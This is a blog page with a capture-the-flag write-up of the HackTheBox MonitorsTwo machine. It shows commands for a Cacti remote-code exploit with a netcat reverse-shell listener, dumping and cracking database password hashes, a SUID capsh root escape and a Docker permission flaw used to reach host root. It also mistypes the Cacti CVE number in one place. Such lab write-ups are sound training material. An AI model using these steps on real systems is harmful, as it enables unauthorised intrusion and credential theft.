<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox: MonitorsTwo write-up - bughunter.me</title><meta name="description" content="In this article we'll crack the MonitorsTwo machine on HackTheBox. The solution involves exploiting an outdated version of Cacti (a server monitoring software), accessing a&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta name="theme-color" content="#17181E" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#D73A42" media="(prefers-color-scheme: light)"><meta name="msapplication-navbutton-color" content="#D73A42"><meta name="apple-mobile-web-app-status-bar-style" content="#D73A42"><link rel="canonical" href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-monitorstwo-write-up/"><link rel="alternate" type="application/atom+xml" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.xml"><link rel="alternate" type="application/json" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.json"><meta property="og:title" content="HackTheBox: MonitorsTwo write-up"><meta property="og:image" content="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitors-two-walkthrough.png"><meta property="og:image:width" content="900"><meta property="og:image:height" content="300"><meta property="og:site_name" content="bughunter.me"><meta property="og:description" content="In this article we'll crack the MonitorsTwo machine on HackTheBox. The solution involves exploiting an outdated version of Cacti (a server monitoring software), accessing a&hellip;"><meta property="og:url" content="https://e4ld3rs0n.github.io/bughunter-publii//hackthebox-monitorstwo-write-up/"><meta property="og:type" content="article"><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/sourcecodepro/sourcecodepro.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/sourcecodepro/sourcecodepro-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/css/style.css?v=785e0319df7b6f4ccd36520f3503248e"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-monitorstwo-write-up/"},"headline":"HackTheBox: MonitorsTwo write-up","datePublished":"2023-05-11T11:52+02:00","dateModified":"2025-01-27T20:23+01:00","image":{"@type":"ImageObject","url":"https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitors-two-walkthrough.png","height":300,"width":900},"description":"In this article we'll crack the MonitorsTwo machine on HackTheBox. The solution involves exploiting an outdated version of Cacti (a server monitoring software), accessing a&hellip;","author":{"@type":"Person","name":"andrey","url":"https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/"},"publisher":{"@type":"Organization","name":"andrey"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><div class="container container--center"><header class="header"><div class="header__logo"><a class="logo" href="https://e4ld3rs0n.github.io/bughunter-publii/">bughunter.me</a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/blog/" target="_self">blog</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/homelab/" target="_self">homelab</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" target="_self">ctf</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/about-me/" title="About this blog" target="_self">whoami</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/privacy-policy/" target="_self">privacy-policy</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii//feed.xml" target="_self">rss-feed</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">HackTheBox: MonitorsTwo write-up</h1><div class="post__meta"><time datetime="2023-05-11T11:52" class="post__date">Thursday, 11 May 2023 </time><span class="post__author"><a href="https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/" class="feed__author">andrey</a></span></div><div class="post__tags"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" class="invert">ctf</a> <a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/hackthebox/" class="invert">hackthebox</a></div></header><figure class="post__image post__cover"><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitors-two-walkthrough.png" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitors-two-walkthrough-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitors-two-walkthrough-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitors-two-walkthrough-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitors-two-walkthrough-lg.png 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="300" width="900" alt=""></figure><div class="post__entry"><p></p><p>In this article we'll crack the MonitorsTwo machine on HackTheBox. The solution involves exploiting an outdated version of Cacti (a server monitoring software), accessing a poorly protected MySQL database, cracking password hashes and abusing Docker permissions. This challenge is rated as <code>easy</code> on HackTheBox.</p><p></p><p></p><h2 class="wp-block-heading">Enumeration and initial access</h2><p></p><p></p><p>As usual, we begin our enumeration process with a port scan. We find out that two services are present, SSH and HTTP, both running on standard ports:</p><p></p><p></p><pre class="wp-block-code"><code>PORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)...80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Login to CactiService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p></p><p></p><p>As indicated by the web service scan results, upon accessing the web page, we encounter a Cacti 1.2.22 login page. Cacti is an open-source, web-based network monitoring and graphing solution that offers a user-friendly interface for managing and visualizing network performance data, usually in the form of graphs and charts.</p><p></p><p></p><p>Upon investigating the specific version of Cacti in use, we find that it is vulnerable to CVE-2022-4612269. This vulnerability enables an unauthenticated attacker to execute arbitrary code on the server hosting Cacti. To exploit this weakness, we turn to GitHub, where we discover one of the many <a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py" target="_blank" rel="noopener">working exploits</a>.</p><p></p><p></p><p>To get a shell on the target all we have to do is open a netcat listener on our machine with <code>rlwrap nc -vlnp 9001</code> and execute the exploit:</p><p></p><p></p><pre class="wp-block-code"><code>$ python3 exploit.py -u http://&lt;TARGET IP&gt;/ --LHOST &lt;LOCAL IP&gt; --LPORT 9001 Checking...The target is vulnerable. Exploiting...Bruteforcing the host_id and local_data_idsBruteforce Success!!</code></pre><p></p><p></p><p>After getting the shell, we can stabilize it with the following commands:</p><p></p><p></p><pre class="wp-block-code"><code>$ export TERM=xterm# Background the session with CTRL+Z$ stty raw -echo; fg;</code></pre><p></p><p></p><h2 class="wp-block-heading">Machine enumeration and user flag</h2><p></p><p></p><p>Upon gaining access to the machine, we immediately notice the presence of a <code>/.dockerenv</code> file which indicates that we are inside a Docker container. We also come across a file named <code>/entrypoint.sh</code>. This file typically serves as the entry point for a Docker container, containing instructions and commands that are executed when the container starts:</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-255"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitortwo-docker-container.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-lg.png 1024w"></figure></figure><p></p><p></p><p>Let's take a look at <code>entrypoint.sh</code>:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">bash-5.1$ cat entrypoint.shcat entrypoint.sh#!/bin/bashset -exwait-for-it db:3306 -t 300 -- echo "database is connected"if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"fichown www-data:www-data -R /var/www/html# first arg is `-f` or `--some-option`if [ "${1#-}" != "$1" ]; then	set -- apache2-foreground "$@"fiexec "$@"</pre><p></p><p></p><p>We have the credentials for the MySQL database! Let's connect to it and take a look:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ mysql --host=db --user=root --password=root...MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || cacti              || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.002 sec)</pre><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">MySQL [(none)]&gt; use cacti;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changed</pre><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">MySQL [cacti]&gt; show tables;+-------------------------------------+| Tables_in_cacti                     |+-------------------------------------+| aggregate_graph_templates           || aggregate_graph_templates_graph     || aggregate_graph_templates_item      |...| user_auth                           |...+-------------------------------------+111 rows in set (0.001 sec)</pre><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">MySQL [cacti]&gt; select * from user_auth;+----+----------+--------------------------------------------------------------+...| id | username | password                                                     |...+----+----------+--------------------------------------------------------------+...|  1 | admin    | $2y$10$mYZqbqQQPgQVmtkN5Lrtj.MC40FezJbQlCKem2sj/VnfkEunLTcQW |...|  3 | guest    | 43e9a4ab75570f5b                                             |...|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |...+----+----------+--------------------------------------------------------------+...3 rows in set (0.001 sec)</pre><p></p><p></p><p>We have obtained a hashed password for the user <code>marcus</code>. Let's store it in a file and attempt to crack it using John The Ripper:</p><p></p><p></p><pre class="wp-block-code"><code>$ john hash.forjohn --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status&lt;REDACTED&gt;      (?)     1g 0:00:01:09 DONE (2023-05-10 16:18) 0.01444g/s 123.2p/s 123.2c/s 123.2C/s 474747..coucouUse the "--show" option to display all of the cracked passwords reliablySession completed.</code></pre><p></p><p></p><p>Excellent, the password is present in the rockyou dictionary and, conveniently, it's also reused for SSH authentication. We can proceed to establish an SSH connection to the target machine by utilizing the credentials we've uncovered and get the user flag.</p><p></p><p></p><h2 class="wp-block-heading">Privilege Escalation and root flag</h2><p></p><p></p><p>After poking around for some time I realized that the target is running a vulnerable version of Docker:</p><p></p><p></p><pre class="wp-block-code"><code>marcus@monitorstwo:~$ docker --versionDocker version 20.10.5+dfsg1, build 55c4c88</code></pre><p></p><p></p><p>This version is vulnerable to CVE-2021-41091 (more details <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41091" target="_blank" rel="noreferrer noopener">here</a>). Moby (the Docker engine) contains a flaw that permits unprivileged Linux users to access and run programs inside containers, resulting from insufficient permissions in the data directory.</p><p></p><p></p><p>In simple terms, it is possible to alter the permissions (for instance, setting the SUID bit) of applications executing within the container, and subsequently run them as an unprivileged user outside the container while preserving the assigned permissions to do all kinds of nasty things. In our case this could be abused by setting the SUID bit on the <code>bash</code> binary inside the container, exfiltrating and running it on the host system to gain root access.</p><p></p><p></p><p>I found a <a href="https://github.com/UncleJ4ck/CVE-2021-41091" target="_blank" rel="noopener">nice exploit on GitHub</a> that we can use to achieve this, but first we need to get root permissions inside the Docker container.</p><p></p><p></p><p>To achieve this I uploaded a copy of linpeas to the target container. It found an interesting file:</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-267"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitortwo-capsh.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-lg.png 1024w"></figure></figure><p></p><p></p><p><code>/sbin/capsh</code> has a SUID bit set - after looking it up on GTFOBins we find the syntax to abuse it and get a root shell:</p><p></p><p></p><pre class="wp-block-code"><code>/sbin/capsh --gid=0 --uid=0 --</code></pre><p></p><p></p><p>Almost there. We can now set the SUID bit on bash with the following command:</p><p></p><p></p><pre class="wp-block-code"><code>chmod u+s /bin/bash</code></pre><p></p><p></p><p>Now let's go back to our host machine, upload and run the exploit I mentioned earlier. It will provide step by step instructions to get a root shell:</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-268"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitortwo-root-shell-on-host.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-lg.png 1024w"></figure></figure><p></p><p></p><p>All that's left to do is grab our root flag!</p><p></p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Monday, 27 January 2025</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-monitorstwo-write-up%2F" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-monitorstwo-write-up%2F" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%3A%20MonitorsTwo%20write-up&amp;url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-monitorstwo-write-up%2F" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%3A%20MonitorsTwo%20write-up https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-monitorstwo-write-up%2F" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-busqueda-write-up/" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  HackTheBox: Busqueda write-up "><span class="btn__icon">←</span> <span class="btn__text">HackTheBox: Busqueda write-up</span> </a><a href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-inject-write-up/" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  HackTheBox: Inject write-up "><span class="btn__text">HackTheBox: Inject write-up</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>© 2023 - 2025 BugHunter</p></div></div></footer></div><script defer="defer" src="https://e4ld3rs0n.github.io/bughunter-publii/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'overlay',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script>class Rot18Encoder { constructor() { this.rotations = [ { from: 'a', to: 'z', offset: 18 }, { from: 'A', to: 'Z', offset: 18 }, { from: '0', to: '9', offset: 5 } ]; } _rotate(char, from, to, offset) { const charCode = char.charCodeAt(0); const fromCode = from.charCodeAt(0); const toCode = to.charCodeAt(0); const range = toCode - fromCode + 1; if (charCode >= fromCode && charCode <= toCode) { const shiftedCode = ((charCode - fromCode + offset) % range) + fromCode; return String.fromCharCode(shiftedCode); } return char; } encode(text) { let encodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.offset); } encodedText += rotatedChar; } return encodedText; } decode(text) { let decodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.to.charCodeAt(0) - rot.from.charCodeAt(0) + 1 - rot.offset); } decodedText += rotatedChar; } return decodedText; } } class TextProcessor { constructor(encoder){ this.encoder = encoder; } encode(text){ return this.encoder.encode(text); } decode(text){ return this.encoder.decode(text); } } document.addEventListener('DOMContentLoaded', function() { const rot18 = new Rot18Encoder(); const coder = new TextProcessor(rot18); var obfElements = document.querySelectorAll('.obfuscated-email'); obfElements.forEach(function(elem) { var dataType = elem.getAttribute('data-type'); var encodedEmail = elem.getAttribute('data-email'); var user = elem.getAttribute('data-user'); var domain = elem.getAttribute('data-domain'); var decodedEmail = ''; if (user && domain) { decodedEmail = coder.decode(user) + '@' + coder.decode(domain); } else if (encodedEmail) { const parts = encodedEmail.split('@'); if (parts.length === 2) { decodedEmail = coder.decode(parts[0]) + '@' + coder.decode(parts[1]); } else { decodedEmail = encodedEmail; } } if (dataType === 'mailto') { var originalText = elem.textContent.trim(); var a = document.createElement('a'); a.href = 'mailto:' + decodedEmail; if (elem.classList.length > 0) { a.className = elem.className; } if (originalText === '') { a.textContent = decodedEmail; } else { a.textContent = originalText; } elem.parentNode.replaceChild(a, elem); } else if (dataType === 'text') { var textNode = document.createTextNode(decodedEmail); elem.parentNode.replaceChild(textNode, elem); } }); });</script></body></html>